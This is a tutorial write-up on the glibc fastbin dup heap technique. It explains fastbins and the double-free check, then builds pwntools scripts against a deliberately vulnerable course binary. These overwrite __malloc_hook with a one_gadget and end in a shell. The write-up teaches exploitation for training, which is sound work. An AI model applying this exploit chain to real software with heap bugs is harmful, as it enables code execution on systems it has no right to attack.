---
title: "The Fastbin Dup"
categories: [Heap, The Fastbin Dup]
tags: [glibc, heap, pwn]
mermaid: true
---

## **Introduction**


Welcome to the second heap exploitation technique we’re going to cover: the **The Fastbin Dup**. 

The **Fastbin Dup** attack exploits the **fastbin** mechanism in `ptmalloc`, the heap allocator used in glibc, to create a double free scenario and gain arbitrary memory allocation control.


The Fastbin Dup (short for "duplication") is a heap exploitation technique that allows attackers to trick malloc into returning the same memory chunk twice. This is a type of "double-free" vulnerability exploitation that specifically targets the fastbin mechanism in glibc's malloc implementation.


### fastbins

Fastbins are a set of bins in `ptmalloc` that store freed chunks of small sizes (<= 0x80 bytes) to optimize performance. When a chunk is freed, it is pushed into its respective fastbin without being merged with adjacent free chunks.

**Key Properties of Fastbins:**
- Chunks are stored **LIFO (Last In, First Out)**.
- **No coalescing** (merging) with adjacent chunks.
- Single-linked lists (only `fd` pointer is used) i.e. the first 8 bytes of a freed chunk store the address of the next free chunk (a singly linked list).
- No integrity checks when chunks are freed into fastbins
- Maximum size of chunks in fastbins is 0x80 bytes (may vary by glibc version)
- When `malloc` requests a chunk, it takes the first available chunk from the corresponding fastbin.

Fastbin Dup exploits the lack of proper checks when:

1. A chunk is freed into a fastbin
2. The same chunk is freed again before being reallocated    

Normally, glibc has checks to prevent double-free, but these checks are incomplete in fastbins.


**DEMO**

```c
// Allocate three chunks
void *a = malloc(0x28); // Fastbin size chunk
void *b = malloc(0x28); // Another fastbin size chunk
void *c = malloc(0x28); // Third chunk

// Free Chunk A twice
free(a);
free(b);
free(a); // Double-free!
```
At this point, the fastbin list looks like:  
`head -> a -> b -> a -> b -> a ...` (cyclic)

```python
# Allocate chunks to manipulate the list
void *d = malloc(0x28); // Returns a
void *e = malloc(0x28); // Returns b
```

```python
# Write to the Allocated chunk to control the `fd` pointer
# We control d which is actually a
*(size_t *)d = target_address; # Overwrite a's fd pointer
```

Now the list is: `head -> a -> target_address`

```python
# Allocate again to get the target address
void *f = malloc(0x28); # Returns a again
void *g = malloc(0x28); # Returns target_address!
```

**Why This Works**

1. When you free a chunk into a fastbin, it's added to the head of the list
2. The second free of 'a' bypasses the double-free check because:
    - The check only compares against the current head of the fastbin
    - Since 'b' is now at the head, 'a' can be freed again
3. By controlling the `fd` pointer during allocation, we can point malloc to any address

### Important Considerations

1. **Size Validation**: The target address must have a size field that matches the fastbin size
    - You may need to fake a size field before your target
    - For 0x28 chunks, the size would be 0x30 (including metadata)

2. **Alignment**: The target address must be properly aligned (16-byte on x64)
    
3. **Mitigations**:    
    - glibc 2.26+ introduced tcache which changes exploitation
    - Some versions have additional checks for fastbins

### Fastbin Structure:

After freeing chunks, the fastbin list grows as follows:

```txt
fastbin[N] → Chunk1 → Chunk2 → Chunk3 → NULL
```

where `Chunk1` was the most recently freed.

The Fastbin Dup attack exploits a **double free** vulnerability to trick `malloc` into returning an arbitrary address.

### Steps:

- Allocate and free a chunk **twice** (double free).
- Modify the forward pointer to inject an arbitrary address.
- Exploit the predictable LIFO behavior to return an attacker-controlled chunk.

### Why does this work?

- Since fastbins do not check for duplicates, a chunk freed twice appears twice in the list.
- This enables allocating the same memory region twice.
- By modifying the forward pointer, we can control where malloc returns a chunk, leading to arbitrary write.

I'll be using the `fastbin_dup` binary from the **[Linux Heap Exploitation](https://www.udemy.com/course/linux-heap-exploitation-part-1)** course on Udemy I did and discussed earlier.

**Fastbins** are optimized for small memory allocations. 

The chunks in a fastbin are **not coalesced** (merged) with adjacent free chunks, which makes allocation and deallocation faster but can lead to fragmentation. When a program requests a small memory chunk, the allocator first checks the corresponding fastbin for a free chunk of the required size. If a chunk of the appropriate size is found in the fastbin, it is removed from the list and returned to the program. If the fastbin is empty, the allocator falls back to other mechanisms (e.g., smallbins or the main heap) to satisfy the request. Fastbins operate in a Last-In-First-Out (LIFO) manner. The most recently freed chunk is the first to be allocated.

Use `fastbins -v` **pwndbg** command to print all fastbins.

```c
#include <stdio.h>
#include <stdlib.h>

int main(){

	void *a = malloc(1);
	void *b = malloc(1);
	void *c = malloc(1);

	free(a);
	free(b);
	free(c);

	void *d = malloc(1);
	void *e = malloc(1);
	void *f = malloc(1);

	return 0;
}

```

Compile this with `glibc 2.30`

```bash
gcc test.c -o test
```

Let's allocate three chunks and view them in `vis` command

```bash
pwndbg> vis

#...
0x555555559280	0x0000000000000000	0x0000000000000000	................
0x555555559290	0x0000000000000000	0x0000000000000021	........!.......
0x5555555592a0	0x0000000000000000	0x0000000000000000	................
0x5555555592b0	0x0000000000000000	0x0000000000000021	........!.......
0x5555555592c0	0x0000000000000000	0x0000000000000000	................
0x5555555592d0	0x0000000000000000	0x0000000000000021	........!.......
0x5555555592e0	0x0000000000000000	0x0000000000000000	................
0x5555555592f0	0x0000000000000000	0x0000000000020d11	................	 <-- Top chunk
```

Now, free the chunks in order they were allocated.

```bash
pwndbg> next 3
pwndbg> vis

0x602000	0x0000000000000000	0x0000000000000021	........!.......	 <-- fastbins[0x20][2]
0x602010	0x0000000000000000	0x0000000000000000	................
0x602020	0x0000000000000000	0x0000000000000021	........!.......	 <-- fastbins[0x20][1]
0x602030	0x0000000000602000	0x0000000000000000	. `.............
0x602040	0x0000000000000000	0x0000000000000021	........!.......	 <-- fastbins[0x20][0]
0x602050	0x0000000000602020	0x0000000000000000	  `.............
0x602060	0x0000000000000000	0x0000000000020fa1	................	 <-- Top chunk

pwndbg> fastbins -v
fastbins
0x20: 0x602040 —▸ 0x602020 —▸ 0x602000 ◂— 0
0x30: 0
0x40: 0
0x50: 0
0x60: 0
0x70: 0
0x80: 0
0x90: 0
0xa0: 0
0xb0: 0

```

Fastbins are used only for small chunk sizes (up to a maximum size defined by the allocator depending on architecture and glibc version).

Since fastbins operate in LIFO order, the next malloc(1) will return the most recently freed chunk at 0x602040 (which was last freed), not the first chunk freed.

```bash
pwndbg> next
15	    void* e = malloc(1);
#...
pwndbg> p d
$1 = (void *) 0x602050
```
```bash
pwndbg> next 
pwndbg> next
pwndbg> p d 
$2 = (void *) 0x602050
pwndbg> p e
$3 = (void *) 0x602030
pwndbg> p f
$4 = (void *) 0x602010
```

#### Introduction to Memory Arenas

In glibc's malloc implementation, **arenas** are structures that manage heap memory for allocation requests. The concept of arenas was introduced to improve performance in multi-threaded applications by reducing lock contention.

**What is the Main Arena?**

The **Main Arena** is the primary heap management structure that handles memory allocation for the main thread. It's created when the program starts and manages the initial heap segment.

Key Characteristics:

- Manages memory for the main thread
- Located in the data segment of the loaded program
- Uses `sbrk()` for heap expansion (contiguous memory)
- Single instance per process

```bash
# Show all arenas
pwndbg> arenas
  arena type    arena address    heap address    map start    map end    perm    size    offset    file
------------  ---------------  --------------  -----------  ---------  ------  ------  --------  ------
  main_arena   0x7ffff7bb4b60        0x602000     0x602000   0x623000    rw-p   21000         0  [heap]
```

Arenas are glibc's way of managing heap allocations. The main arena handles the main thread's memory requests, while additional thread arenas are created for worker threads to prevent lock contention. Each arena manages its own separate heap space - the main arena grows contiguously with **sbrk()**, while thread arenas use **mmap()** for non-contiguous memory regions.

`main_arena` is the primary heap management structure in glibc that handles all memory allocations for the main thread. It's a global variable located in libc's data section that tracks:

- Free chunks (fastbins, smallbins, largebins)
- Top chunk - remaining available memory
- Heap statistics and metadata
- Locking information for thread safety

```bash
pwndbg> dq &main_arena
00007ffff7bb4b60     0000000000000000 0000000000000001
00007ffff7bb4b70     0000000000602040 0000000000000000
00007ffff7bb4b80     0000000000000000 0000000000000000
00007ffff7bb4b90     0000000000000000 0000000000000000
```
`0000000000602040` is the head of `0x20` fastbin which currently hold the address of recently freed chunk.

```bash
pwndbg> fastbins
fastbins
0x20: 0x602040 —▸ 0x602020 —▸ 0x602000 ◂— 0
```

For regular chunks, the `PREV_INUSE` flag in the size field indicates whether the previous chunk is in use:

- `PREV_INUSE` = 1: Previous chunk is allocated
- `PREV_INUSE` = 0: Previous chunk is free (enables consolidation)

Fastbins **always** have `PREV_INUSE` = 1, even when the previous chunk is actually free!

Following ASCII diagram will help you to understand it better:

```txt
Memory Addresses:
0x602000: [CHUNK A HEADER]  Size = 0x21 (0x20 + PREV_INUSE=1)
0x602010: [CHUNK A FD]      = 0x00000000 (NULL - end of list)

0x602020: [CHUNK B HEADER]  Size = 0x21 (0x20 + PREV_INUSE=1)  
0x602030: [CHUNK B FD]      = 0x602000 (points to Chunk A's header)

0x602040: [CHUNK C HEADER]  Size = 0x21 (0x20 + PREV_INUSE=1)
0x602050: [CHUNK C FD]      = 0x602020 (points to Chunk B's header)

0x602060: [TOP CHUNK HEADER] Size = 0x20fa1
0x602068: [TOP CHUNK DATA]   Remaining heap space
```

Now that we understand the theory behind fastbins and the double-free vulnerability, let's apply this knowledge to a practical exploitation scenario. We'll work with a deliberately vulnerable binary that demonstrates the Fastbin Dup technique.


When we run the vulnerable binary, we're presented with the following interface:

```bash
./fastbin_dup 

===============
|   HeapLAB   |  Fastbin Dup
===============

puts() @ 0x78487866faf0

Enter your username: AAAA

1) malloc 0/7
2) free
3) target
4) quit

```
`puts() @ 0x78487866faf0` - This gives us the address of puts in libc


Based on the binary name and menu options, this appears to be a classic double-free vulnerability scenario. Our exploitation strategy will be:

- Create a double-free condition to corrupt the fastbin linked list
- Leak heap addresses if necessary
- Achieve arbitrary write by controlling the fastbin FD pointers
- Hijack control flow by overwriting GOT entries or hooks


Let's load the binary in GDB.

```bash
$ gdb ./fastbin_dup 
pwndbg> r
===============
|   HeapLAB   |  Fastbin Dup
===============

puts() @ 0x7ffff786faf0

Enter your username: AAAA

1) malloc 0/7
2) free
3) target
4) quit
> 
```

We will try to allocate two chunks each of size `0x28` because we will try to target `0x30` fastbin. After allocation we will try to double free a chunk.

But we will see this error.

```bash
index: 0
double free or corruption (fasttop)

```

This is due to the glibc protection on double free.

Modern glibc includes a basic double-free detection mechanism:

```c
// glibc's malloc.c double-free check
if (__builtin_expect (old == p, 0)) {
    errstr = "double free or corruption (fasttop)";
    goto errout;
}

```

This check compares the current chunk being freed (`p`) with the current top of the fastbin (`old`). If they're the same, it detects the double-free attempt.


### Bypassing Double-Free Protection

**The Classic Bypass Technique**

The protection can be bypassed by freeing an intermediate chunk between the two frees of the target chunk:

```txt
Instead of: free(A); free(A)  # Detected!

Use: free(A); free(B); free(A)  # Bypasses protection
```

**Practical Bypass Strategy**

```python
# Bypass double-free protection
free(0)  # Free chunk A
free(1)  # Free chunk B (intermediate)
free(0)  # Free chunk A again - now bypassed!
```

I am using the following **pwntools** script for automation.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'fastbin_dup')
libc = ELF(exe.libc.path, checksec=False) 

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def malloc(size, data):
    global idx 
    idx += 1
    io.recvuntil(b'> ')
    io.sendline(b'1')
    io.recvuntil(b'size: ')
    io.sendline(f"{size}")
    io.recvuntil(b'data: ')
    io.sendline(data)
    return idx -1

def free(idx):
    io.recvuntil(b'> ')
    io.sendline(b'2')
    io.recvuntil(b'index: ')
    io.sendline(f"{idx}")
    
# -- Exploit goes here --

io = start()

io.recvuntil(b'puts() @ ')

puts = io.recvline() # 0x7a03db46faf0
libc.address = int(puts, 16) - libc.sym.puts
log.success(f"libc base @ {hex(libc.address)}")

io.recvuntil(b'username:')

io.sendline(b'AAAAAAAA')

"""
1) malloc 0/7
2) free
3) target
4) quit
> 
"""
# Step 1: Allocate chunks for the double-free attack
log.info("Allocating chunks for double-free attack...")

idx = 0
A = malloc(0x28, b'A'*0x28)  # Chunk A at index 0
B = malloc(0x28, b'B'*0x28)  # Chunk B at index 1

log.success("Chunks allocated successfully")

# Step 2: Execute the double-free bypass
log.info("Executing double-free bypass...")

free(A)  # Free chunk A → goes to fastbin
free(B)  # Free chunk B (intermediate) → goes to fastbin after A
free(A)  # Free chunk A again → bypasses double-free check!

io.interactive()

```


We can run this script and analyze the fastbins in GDB

```bash
$ ./double_free.py NOASLR GDB

# Press 'c' and Hit enter in GDB window
```

After the double-free bypass, let's examine the fastbins in GDB:

```bash
# Then Break in GDB with `Ctrl + C`
# Then view the fastbins
pwndbg> fastbins 
fastbins
0x30: 0x603000 —▸ 0x603030 ◂— 0x603000
```
This confirms that we are able to double free a chunk and bypas the classic double free check.

**Visualizing the Corrupted Fastbin**

```txt
Fastbin Linked List After Double-Free:

+----------------+     +----------------+     +----------------+
|   CHUNK A      |     |   CHUNK B      |     |   CHUNK A      |
| 0x603000       |---->| 0x603030       |---->| 0x603000       |---+
| FD: 0x603030   |     | FD: 0x603000   |     | FD: 0x603030   |   |
+----------------+     +----------------+     +----------------+   |
    ^                                                              |
    +--------------------------------------------------------------+
```

The binary contains a critical `struct user` structure that we can target for exploitation:

```bash
pwndbg> ptype user
type = struct user {
    char username[16];
    char target[16];
}
```

Total size: 32 bytes (0x20 bytes)
Fastbin size: 0x30 chunks are perfect (0x20 user data + 0x10 chunk header = 0x30)

Our goal is to overwrite the `target` member of the `user` structure using the fastbin duplication vulnerability. Here's our step-by-step approach:

### Step 1: Locate the User Structure in Memory

First, we need to find where the `user` structure is allocated in the heap.

### Step 2: Fastbin Dup to Overwrite Target

Now we'll use the fastbin duplication to overwrite the `target` field.

### Step 3: Verify the `target` member

We will use the option `3` to verify our `target` member


By combining all these steps I've developed the following script. I've added comments which will help you better understand it.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'fastbin_dup')
libc = ELF(exe.libc.path, checksec=False) 

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def malloc(size, data):
    global idx 
    idx += 1
    io.recvuntil(b'> ')
    io.sendline(b'1')
    io.recvuntil(b'size: ')
    io.sendline(f"{size}")
    io.recvuntil(b'data: ')
    io.sendline(data)
    return idx -1

def free(idx):
    io.recvuntil(b'> ')
    io.sendline(b'2')
    io.recvuntil(b'index: ')
    io.sendline(f"{idx}")
    
# -- Exploit goes here --

io = start()

io.recvuntil(b'puts() @ ')

puts = io.recvline() # 0x7a03db46faf0
libc.address = int(puts, 16) - libc.sym.puts
log.success(f"libc base @ {hex(libc.address)}")

io.recvuntil(b'username:')

# io.sendline(b'AAAAAAAA') # This makes it look like  0000000000602010     4141414141414141 000000000000000a
io.sendline(p64(0xdeadbeef) + p64(0x31))

"""
pwndbg> dq &user
0000000000602010     00000000deadbeef 0000000000000031
0000000000602020     0058585858585858 0000000000000000
"""

"""
1) malloc 0/7
2) free
3) target
4) quit
> 
"""

idx = 0
A = malloc(0x28, b'A'*0x28) # 0
B = malloc(0x28, b'B'*0x28) # 1

free(A) # free chunk A
free(B) # Intermediate free to bypass double free check
free(A) # double free chunk A

"""
fastbins
0x30: 0x603000 —▸ 0x603030 ◂— 0x603000
        A      ->   B      ->  A
"""

user = exe.sym['user']
log.success(f"`struct user` @ {hex(user)}")

malloc(0x28, p64(user)) # 2 -> 0x603000
"""
fastbins
0x30: 0x603030 —▸ 0x603000 —▸ 0x602010 (user) ◂— 0x58585858585858 /* 'XXXXXXX' */
        B      ->   A      -> user
"""

"""
pwndbg> dq 0x603000
0000000000603000     0000000000000000 0000000000000031
0000000000603010     0000000000602010 414141414141410a
"""

"""
fastbins
0x30: 0x603030 —▸ 0x603000 —▸ 0x602010 (user) ◂— 0x58585858585858 /* 'XXXXXXX' */
"""

malloc(0x28,b'C'*8) # 3 -> 0x603030 (B)
malloc(0x28,b'D'*8) # 4 -> 0x603000 (A)
malloc(0x28, b'HACKED!') # 0x602010 (user) -> 'XXXXXXX' -> 'HACKED!'


io.interactive()
```

By running above script - 

```bash
$ ./double_free.py 
#...
1) malloc 6/7
2) free
3) target
4) quit
> $ 3

target: HACKED!
```

This confirms we have **arbitrary write capability**. Now let's escalate to full code execution by targeting `__malloc_hook`.


### Exploitation Strategy

#### Step 1: Calculate `__malloc_hook` Address

```python
# Calculate __malloc_hook address from libc base
malloc_hook_addr = libc.symbols['__malloc_hook']
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))

log.info(f"__malloc_hook: {hex(malloc_hook_addr)}")
log.info(f"system: {hex(system_addr)}")
log.info(f"/bin/sh: {hex(binsh_addr)}")
```

#### Step 2: Fastbin Dup to Overwrite `__malloc_hook`

If we try to use `__malloc_hook` we will get error!

```txt
   3593               if (__builtin_expect (victim_idx != idx, 0))
 ► 3594                 malloc_printerr ("malloc(): memory corruption (fast)");
   3595               check_remalloced_chunk (av, victim, nb);
```

If we try to dump memory near `__malloc_hook`

```bash
pwndbg> dq &__malloc_hook
00007ffff7bb4b50     0000000000000000 0000000000000000
00007ffff7bb4b60     0000000000000000 0000000000000001
```

We can see that it doesn't fit a valid "sized" chunk condition.

Hence we need to create or find a fake chunk and for that we need to use `find_fake_fast` command in GDB.

```bash
pwndbg> find_fake_fast &__malloc_hook
Searching for fastbin size fields up to 0x80, starting at 0x7ffff7bb4ad8 resulting in an overlap of 0x7ffff7bb4b50
FAKE CHUNKS
Fake chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x7ffff7bb4b2d
prev_size: 0xfff7bb0ee0000000
size: 0x78 (with flag bits: 0x7f)
fd: 0xfff7883a10000000
bk: 0xfff7883ed000007f
fd_nextsize: 0x7f
bk_nextsize: 0x00

```

If you try to dump quadwords at address `0x7ffff7bb4b2d`

```bash
pwndbg> dq 0x7ffff7bb4b2d
00007ffff7bb4b2d     fff7bb0ee0000000 000000000000007f
00007ffff7bb4b3d     fff7883a10000000 fff7883ed000007f
00007ffff7bb4b4d     000000000000007f 0000000000000000
```

As you can see this looks like a valid chunk with size `0x78`.
Let's calculate how far is this fake chunk from our `__malloc_hook`.

```bash
pwndbg> p/x &__malloc_hook
$4 = 0x7ffff7bb4b50
pwndbg> p/d  0x7ffff7bb4b50 - 0x7ffff7bb4b2d
$5 = 35
```

Hence we need to use -

```python
free_hook_addr = libc.symbols['__malloc_hook']
fake_malloc_addr = free_hook_addr - 35  # Common offset that works
```

Now we need to calculate the offset to `__free_hook` because we need to overwrite the pointer which is `0x0` stored at `__malloc_hook` with our desired address which we will use `0xdeadbeef` just for demonstration.

```bash
pwndbg> p/x 0x7ffff7bb4b50 - 0x7ffff7bb4b3d  # __malloc_hook - fake_chunk_data
$1 = 0x13  # 19 bytes offset
```

It's simple now, we will craft our exploit like this - 

```python
# Padding to reach __malloc_hook + target address
payload = b'A' * 0x13 + p64(0xdeadbeef)
malloc(0x68, payload)  # Overwrites __malloc_hook
```

**Complete Exploitation Flow**

1. Allocate chunks A, B (0x68 size → 0x70 fastbin)
2. free(A) → free(B) → free(A)  # Create fastbin loop
3. Corrupt FD to point to fake chunk near `__malloc_hook`
4. Allocate to traverse: gets B, then A  
5. Allocate fake chunk and overwrite `__malloc_hook`
6. Trigger by calling `malloc()`


Final script looks like  this -

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'fastbin_dup')
libc = ELF(exe.libc.path, checksec=False) 

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def malloc(size, data):
    global idx 
    idx += 1
    io.recvuntil(b'> ')
    io.sendline(b'1')
    io.recvuntil(b'size: ')
    io.sendline(f"{size}")
    io.recvuntil(b'data: ')
    io.sendline(data)
    return idx -1

def free(idx):
    io.recvuntil(b'> ')
    io.sendline(b'2')
    io.recvuntil(b'index: ')
    io.sendline(f"{idx}")
    
# -- Exploit goes here --

io = start()

io.recvuntil(b'puts() @ ')

puts = io.recvline() # 0x7a03db46faf0
libc.address = int(puts, 16) - libc.sym.puts
log.success(f"libc base @ {hex(libc.address)}")

io.recvuntil(b'username:')

io.sendline(p64(0xdeadbeef) + p64(0x31))

"""
pwndbg> dq &user
0000000000602010     00000000deadbeef 0000000000000031
0000000000602020     0058585858585858 0000000000000000
"""

"""
1) malloc 0/7
2) free
3) target
4) quit
> 
"""

idx = 0
A = malloc(0x68, b'A'*0x28) # 0
B = malloc(0x68, b'B'*0x28) # 1

free(A) # free chunk A
free(B) # Intermediate free to bypass double free check
free(A) # double free chunk A

"""
fastbins
0x30: 0x603000 —▸ 0x603030 ◂— 0x603000
        A      ->   B      ->  A
"""

malloc_hook_addr = libc.symbols['__malloc_hook']
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))

log.info(f"__malloc_hook: {hex(malloc_hook_addr)}")
log.info(f"system: {hex(system_addr)}")
log.info(f"/bin/sh: {hex(binsh_addr)}")

fake_malloc_addr = malloc_hook_addr - 35
malloc(0x68, p64(fake_malloc_addr)) # 2 -> 0x603000


# Now we need to find the offset to fill after which we can write our 0xdeadbeef address
# We will start filling from our fake chunk till we overwrite __malloc_hook

"""
pwndbg> dq 0x7ffff7bb4b2d
00007ffff7bb4b2d     fff7bb0ee0000000 000000000000007f
00007ffff7bb4b3d     fff7883a10000000 fff7883ed000007f
00007ffff7bb4b4d     000000000000007f 0000000000000000
00007ffff7bb4b5d     0000000000000000 0000000001000000
pwndbg> p &__malloc_hook
$1 = (void *(**)(size_t, const void *)) 0x7ffff7bb4b50 <__malloc_hook>
pwndbg> p/x 0x7ffff7bb4b50-0x7ffff7bb4b3d 
$2 = 0x13

"""

malloc(0x68,b'C'*8) # 3 -> 0x603030 (B)
malloc(0x68,b'D'*8) # 4 -> 0x603000 (A)
malloc(0x68, b'A'*0x13 + p64(0xdeadbeef)) # 0x7ffff7bb6e20 (__malloc_hook) -> 0xdeadbeef

"""
pwndbg> p &__malloc_hook
$1 = (void *(**)(size_t, const void *)) 0x7ffff7bb4b50 <__malloc_hook>
pwndbg> p __malloc_hook
$2 = (void *(*)(size_t, const void *)) 0xdeadbeef
"""

# Next malloc call will call 0xdeadbeef
malloc(0x68, b'')

io.interactive()

```

On using this script we can see we redirected execution to `0xdeadbeef`

```txt

Program received signal SIGSEGV, Segmentation fault.
0x00000000deadbeef in ?? ()
...
*RIP  0xdeadbeef
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
Invalid address 0xdeadbeef

```

Our next goal should be converting this to Code Execution using the `one_gadget`!

```bash
$ ldd fastbin_dup 
	linux-vdso.so.1 (0x00007ffe335a3000)
	libc.so.6 => ../.glibc/glibc_2.30_no-tcache/libc.so.6 (0x00007911c9400000)
	../.glibc/glibc_2.30_no-tcache/ld.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007911c993f000)
$ one_gadget ../.glibc/glibc_2.30_no-tcache/libc.so.6
0xc4dbf execve("/bin/sh", r13, r12)
constraints:
  [r13] == NULL || r13 == NULL || r13 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xc4ddf execve("/bin/sh", rbp-0x40, r12)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xc4de6 execve("/bin/sh", rbp-0x40, r12)
constraints:
  address rbp-0x38 is writable
  rax == NULL || {rax, rdi, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe1fa1 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv
```

I tried using them one-by-one and `0xe1fa1` worked for me!

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'fastbin_dup')
libc = ELF(exe.libc.path, checksec=False) 

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def malloc(size, data):
    global idx 
    idx += 1
    io.recvuntil(b'> ')
    io.sendline(b'1')
    io.recvuntil(b'size: ')
    io.sendline(f"{size}")
    io.recvuntil(b'data: ')
    io.sendline(data)
    return idx -1

def free(idx):
    io.recvuntil(b'> ')
    io.sendline(b'2')
    io.recvuntil(b'index: ')
    io.sendline(f"{idx}")
    
# -- Exploit goes here --

io = start()

io.recvuntil(b'puts() @ ')

puts = io.recvline() # 0x7a03db46faf0
libc.address = int(puts, 16) - libc.sym.puts
log.success(f"libc base @ {hex(libc.address)}")

io.recvuntil(b'username:')

io.sendline(p64(0xdeadbeef) + p64(0x31))

"""
pwndbg> dq &user
0000000000602010     00000000deadbeef 0000000000000031
0000000000602020     0058585858585858 0000000000000000
"""

"""
1) malloc 0/7
2) free
3) target
4) quit
> 
"""

idx = 0
A = malloc(0x68, b'A'*0x28) # 0
B = malloc(0x68, b'B'*0x28) # 1

free(A) # free chunk A
free(B) # Intermediate free to bypass double free check
free(A) # double free chunk A

"""
fastbins
0x30: 0x603000 —▸ 0x603030 ◂— 0x603000
        A      ->   B      ->  A
"""

malloc_hook_addr = libc.symbols['__malloc_hook']
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))

log.info(f"__malloc_hook: {hex(malloc_hook_addr)}")
log.info(f"system: {hex(system_addr)}")
log.info(f"/bin/sh: {hex(binsh_addr)}")

fake_malloc_addr = malloc_hook_addr - 35
malloc(0x68, p64(fake_malloc_addr)) # 2 -> 0x603000


# Now we need to find the offset to fill after which we can write our 0xdeadbeef address
# We will start filling from our fake chunk till we overwrite __malloc_hook

"""
pwndbg> dq 0x7ffff7bb4b2d
00007ffff7bb4b2d     fff7bb0ee0000000 000000000000007f
00007ffff7bb4b3d     fff7883a10000000 fff7883ed000007f
00007ffff7bb4b4d     000000000000007f 0000000000000000
00007ffff7bb4b5d     0000000000000000 0000000001000000
pwndbg> p &__malloc_hook
$1 = (void *(**)(size_t, const void *)) 0x7ffff7bb4b50 <__malloc_hook>
pwndbg> p/x 0x7ffff7bb4b50-0x7ffff7bb4b3d 
$2 = 0x13

"""

malloc(0x68,b'C'*8) # 3 -> 0x603030 (B)
malloc(0x68,b'D'*8) # 4 -> 0x603000 (A)
# malloc(0x68, b'A'*0x13 + p64(0xdeadbeef)) # 0x7ffff7bb6e20 (__malloc_hook) -> 0xdeadbeef

system_addr = libc.address + 0xe1fa1
malloc(0x68, b'A'*0x13 + p64(system_addr)) # 0x7ffff7bb6e20 (__malloc_hook) -> system

# Next malloc call will call -> 0xe1fa1 execve("/bin/sh", rsp+0x50, environ)
# malloc(0x68, b'')
io.recvuntil(b'> ')
io.sendline(b'1')
io.recvuntil(b'size: ')
io.sendline(b'')

io.interactive()

```

```bash
./exploit.py
# 
$ whoami
fury

```

